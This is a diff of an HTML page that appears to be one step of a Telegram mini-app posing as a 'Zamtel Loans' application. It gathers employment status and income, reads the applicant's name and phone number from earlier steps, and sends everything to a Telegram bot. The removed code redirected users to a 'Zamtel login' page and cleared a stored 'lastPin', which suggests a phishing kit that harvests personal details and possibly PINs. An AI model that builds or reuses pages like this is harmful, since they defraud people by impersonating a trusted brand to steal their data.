@@ -3,175 +3,284 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Application Submitted - Zamtel Loans</title>
+    <title>Loan Application - Summary</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f7f9fb;
+            background-color: #f8f9fa;
             margin: 0;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
             align-items: center;
-            height: 100vh;
         }
 
-        .success-card {
-            background: white;
-            width: 90%;
-            max-width: 400px;
-            padding: 40px 20px;
-            border-radius: 20px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-        }
-
-        .check-circle {
-            width: 100px;
-            height: 100px;
-            background-color: #237A3B;
-            border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0 auto 30px;
+        .nav-header {
+            width: 100%;
+            background: linear-gradient(90deg, #288844 0%, #30A150 100%);
+            padding: 15px 20px;
             color: white;
-            font-size: 50px;
-        }
-
-        h1 {
-            color: #237A3B;
-            font-size: 28px;
-            margin-bottom: 20px;
-        }
-
-        p {
-            color: #666;
-            font-size: 16px;
-            margin: 5px 0;
-        }
-
-        .timer-container {
-            background-color: #f9f9f9;
-            border-radius: 12px;
-            padding: 15px;
-            margin: 30px 0;
             display: flex;
-            justify-content: center;
+            justify-content: space-between;
             align-items: center;
-            gap: 10px;
-            color: #237A3B;
-            font-weight: 500;
+            box-sizing: border-box;
         }
 
-        .loader-spinner {
-            width: 18px;
-            height: 18px;
-            border: 2px solid #e0e0e0;
-            border-top: 2px solid #237A3B;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
+        .zamtel-logo {
+            font-size: 24px;
+            font-weight: bold;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .btn-home {
+        .form-card {
             background: white;
-            border: 1px solid #ddd;
-            color: #777;
+            width: 92%;
+            max-width: 480px;
+            margin-top: 25px;
+            padding: 30px 20px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            box-sizing: border-box;
+        }
+
+        h2 {
+            text-align: center;
+            margin: 0;
+            font-size: 26px;
+            color: #333;
+            font-weight: 600;
+        }
+
+        .step-info {
+            text-align: center;
+            font-size: 15px;
+            color: #888;
+            margin: 10px 0 25px;
+        }
+
+        .progress-box {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 35px;
+        }
+
+        .bar {
+            height: 4px;
+            flex: 1;
+            background: #237A3B;
+            border-radius: 2px;
+        }
+
+        .input-wrap {
+            margin-bottom: 22px;
+        }
+
+        label {
+            display: block;
+            font-size: 16px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            color: #333;
+        }
+
+        select, input {
             width: 100%;
             padding: 15px;
-            border-radius: 10px;
-            font-size: 16px;
-            cursor: pointer;
+            border: 1px solid #d1d1d1;
+            border-radius: 8px;
+            font-size: 17px;
+            box-sizing: border-box;
+            background: #fff;
         }
 
-        .top-toast {
-            position: fixed;
-            top: 20px;
-            background: #1a1c1e;
-            color: white;
-            padding: 12px 20px;
-            border-radius: 10px;
+        .summary-box {
+            background-color: #fcfcfc;
+            border-left: 5px solid #237A3B;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 25px 0;
+        }
+
+        .summary-box h3 {
+            margin: 0 0 15px 0;
+            font-size: 18px;
+            font-weight: 700;
+        }
+
+        .summary-item {
             display: flex;
-            align-items: center;
-            gap: 10px;
+            justify-content: space-between;
+            margin-bottom: 12px;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 8px;
+        }
+
+        .summary-label {
+            color: #666;
             font-size: 14px;
+        }
+
+        .summary-value {
+            font-weight: 600;
+            font-size: 14px;
+            color: #000;
+            text-align: right;
+        }
+
+        .btn-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .back-btn {
+            background: #b0b0b0;
+            color: white;
+            border: none;
+            padding: 16px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .submit-btn {
+            background: linear-gradient(90deg, #288844 0%, #237A3B 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            text-transform: uppercase;
+        }
+
+        .footer-text {
+            text-align: center;
+            font-size: 13px;
+            color: #aaa;
+            margin: 40px 0 30px;
         }
     </style>
 </head>
 
 <body>
 
-<div class="top-toast">
-    <span style="color:#237A3B;">✔</span>
-    <span>Application submitted successfully!</span>
+<div class="nav-header">
+    <div onclick="goBack()" style="cursor:pointer; font-size:20px;">← Back</div>
+    <div class="zamtel-logo">Zamtel Loans</div>
+    <div style="font-size: 26px;">☰</div>
 </div>
 
-<div class="success-card">
-    <div class="check-circle">✓</div>
+<div class="form-card">
+    <h2>Loan Application</h2>
+    <p class="step-info">Step 3 of 3</p>
 
-    <h1>Loan Application<br>Submitted</h1>
-
-    <p>Your application has been received. Please wait for approval.</p>
-    <p>You will receive a confirmation message shortly.</p>
-
-    <div class="timer-container">
-        <div class="loader-spinner"></div>
-        <span>
-            Redirecting to Zamtel login in 
-            <span id="timer">5</span> seconds...
-        </span>
+    <div class="progress-box">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
     </div>
 
-    <button type="button" class="btn-home" onclick="goToPage6()">
-        Go to Login Now
-    </button>
+    <div class="input-wrap">
+        <label>Employment Status</label>
+        <select id="jobStatus">
+            <option value="Employed">Employed</option>
+            <option value="Self-Employed">Self-Employed</option>
+            <option value="Student">Student</option>
+            <option value="Unemployed">Unemployed</option>
+            <option value="Retired">Retired</option>
+        </select>
+    </div>
+
+    <div class="input-wrap">
+        <label>Annual Income (ZMW)</label>
+        <input type="text" id="income" placeholder="Example: 120000">
+    </div>
+
+    <div class="summary-box">
+        <h3>Application Summary</h3>
+
+        <div class="summary-item">
+            <span class="summary-label">Loan Amount:</span>
+            <span class="summary-value" id="sumAmount">--</span>
+        </div>
+
+        <div class="summary-item">
+            <span class="summary-label">Loan Term:</span>
+            <span class="summary-value" id="sumDuration">--</span>
+        </div>
+
+        <div class="summary-item">
+            <span class="summary-label">Purpose:</span>
+            <span class="summary-value" id="sumPurpose">--</span>
+        </div>
+
+        <div class="summary-item">
+            <span class="summary-label">Applicant:</span>
+            <span class="summary-value" id="sumName">--</span>
+        </div>
+    </div>
+
+    <div class="btn-container">
+        <button type="button" class="back-btn" onclick="goBack()">BACK</button>
+        <button type="button" class="submit-btn" onclick="submitForm()">SUBMIT APPLICATION</button>
+    </div>
 </div>
 
+<div class="footer-text">© 2026 Zamtel Zambia</div>
+
 <script>
-    let timeLeft = 5;
-    let interval;
-
-    function updateTimer() {
-        const el = document.getElementById('timer');
-        if (el) el.textContent = timeLeft;
+window.onload = () => {
+    const tg = window.Telegram?.WebApp;
+    if (tg) {
+        tg.ready();
+        tg.expand();
     }
 
-    function goToPage6() {
-        if (interval) clearInterval(interval);
+    const amount = localStorage.getItem('amount');
+    const duration = localStorage.getItem('loanDuration');
+    const purpose = localStorage.getItem('loanPurpose');
+    const fName = localStorage.getItem('firstName') || "";
+    const lName = localStorage.getItem('lastName') || "";
 
-        localStorage.removeItem('lastPin');
-        
-        window.location.href = "/page6";
-    }
+    document.getElementById('sumAmount').innerText = amount ? `${Number(amount).toLocaleString()} ZMW` : "--";
+    document.getElementById('sumDuration').innerText = duration || "--";
+    document.getElementById('sumPurpose').innerText = purpose || "--";
+    document.getElementById('sumName').innerText = `${fName} ${lName}`.trim() || "--";
+};
 
-    window.onload = () => {
-        const tg = window.Telegram?.WebApp;
-        if (tg) {
-            tg.ready();
-            tg.expand();
-        }
+function submitForm() {
+    const tg = window.Telegram?.WebApp;
 
-        updateTimer();
-
-        interval = setInterval(() => {
-            timeLeft--;
-
-            if (timeLeft <= 0) {
-                clearInterval(interval);
-                goToPage6();
-                return;
-            }
-
-            updateTimer();
-        }, 1000);
+    const data = {
+        amount: localStorage.getItem('amount'),
+        duration: localStorage.getItem('loanDuration'),
+        purpose: localStorage.getItem('loanPurpose'),
+        firstName: localStorage.getItem('firstName'),
+        lastName: localStorage.getItem('lastName'),
+        phone: localStorage.getItem('phone'),
+        jobStatus: document.getElementById('jobStatus').value,
+        income: document.getElementById('income').value
     };
+
+    if (tg && tg.sendData) {
+        tg.sendData(JSON.stringify(data));
+        setTimeout(() => {
+            window.location.href = "/page5";
+        }, 500);
+    } else {
+        console.log("Submitted:", data);
+        window.location.href = "/page5";
+    }
+}
+
+function goBack() {
+    window.location.href = "/page3";
+}
 </script>
 
 </body>
